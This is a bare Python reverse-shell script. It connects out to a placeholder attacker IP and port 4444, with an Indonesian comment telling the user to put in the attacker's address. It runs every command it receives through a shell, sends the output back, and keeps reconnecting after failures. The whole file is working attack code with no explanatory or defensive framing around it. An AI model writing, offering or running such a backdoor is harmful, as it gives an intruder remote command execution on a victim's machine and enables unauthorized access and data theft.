import socket
import subprocess
import os

def main():
    ATTACKER_IP = "192.168.1.100"  # Ganti dengan IP attacker
    ATTACKER_PORT = 4444

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))

            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    s.close()
                    return
                if command.strip() == "":
                    continue

                # Execute command
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    if output == "":
                        output = "[+] Command executed (no output)"
                except Exception as e:
                    output = str(e)

                s.send(output.encode())
        except Exception:
            # Reconnect on failure
            pass

if __name__ == "__main__":
    main()
